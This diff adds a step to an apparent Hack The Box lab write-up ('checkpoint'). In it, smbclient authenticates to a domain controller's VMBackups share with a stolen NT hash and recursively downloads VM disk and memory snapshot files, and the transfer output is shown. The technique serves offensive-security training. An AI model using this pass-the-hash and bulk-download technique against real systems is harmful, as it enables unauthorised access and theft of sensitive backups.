@@ -1285,5 +1285,22 @@ SMB         dc01.checkpoint.htb 445    DC01             VMBackups       READ
 
 ```
 
+``` bash
+
+❯ smbclient //dc01.checkpoint.htb/VMBackups -U 'checkpoint.htb/svc_deploy' --pw-nt-hash e16081eb077aca74bdbf8af12af43ac9 -c 'recurse ON; prompt OFF; mget *'
+getting file \NightlyBackup_2024-11-01\memory forensics\Windows Server 2019-000001.vmdk of size 106496000 as NightlyBackup_2024-11-01/memory forensics/Windows Server 2019-000001.vmdk (3404.8 KiloBytes/sec) (average 3404.8 KiloBytes/sec)
+getting file \NightlyBackup_2024-11-01\memory forensics\Windows Server 2019-Snapshot1.vmem of size 2147483648 as NightlyBackup_2024-11-01/memory forensics/Windows Server 2019-Snapshot1.vmem (3732.0 KiloBytes/sec) (average 3715.1 KiloBytes/sec)
+getting file \NightlyBackup_2024-11-01\memory forensics\Windows Server 2019-Snapshot1.vmsn of size 138164859 as NightlyBackup_2024-11-01/memory forensics/Windows Server 2019-Snapshot1.vmsn (3288.2 KiloBytes/sec) (average 3687.5 KiloBytes/sec)
+getting file \NightlyBackup_2024-11-01\memory forensics\Windows Server 2019.nvram of size 270840 as NightlyBackup_2024-11-01/memory forensics/Windows Server 2019.nvram (1329.1 KiloBytes/sec) (average 3686.7 KiloBytes/sec)
+getting file \NightlyBackup_2024-11-01\memory forensics\Windows Server 2019.scoreboard of size 7642 as NightlyBackup_2024-11-01/memory forensics/Windows Server 2019.scoreboard (50.4 KiloBytes/sec) (average 3685.9 KiloBytes/sec)
+getting file \NightlyBackup_2024-11-01\memory forensics\Windows Server 2019.vmdk of size 10199695360 as NightlyBackup_2024-11-01/memory forensics/Windows Server 2019.vmdk (3205.3 KiloBytes/sec) (average 3286.7 KiloBytes/sec)
+getting file \NightlyBackup_2024-11-01\memory forensics\Windows Server 2019.vmsd of size 502 as NightlyBackup_2024-11-01/memory forensics/Windows Server 2019.vmsd (3.5 KiloBytes/sec) (average 3286.6 KiloBytes/sec)
+getting file \NightlyBackup_2024-11-01\memory forensics\Windows Server 2019.vmx of size 2749 as NightlyBackup_2024-11-01/memory forensics/Windows Server 2019.vmx (19.0 KiloBytes/sec) (average 3286.5 KiloBytes/sec)
+getting file \NightlyBackup_2024-11-01\memory forensics\Windows Server 2019.vmxf of size 274 as NightlyBackup_2024-11-01/memory forensics/Windows Server 2019.vmxf (1.2 KiloBytes/sec) (average 3286.3 KiloBytes/sec)
+╭─ ~/hacking/ctf/htb/medium/checkpoint/scripts                                                     ✔ │ 1h 2m 23s ─╮
+╰─                                                                                                               ─╯
+
+```
+
 
 
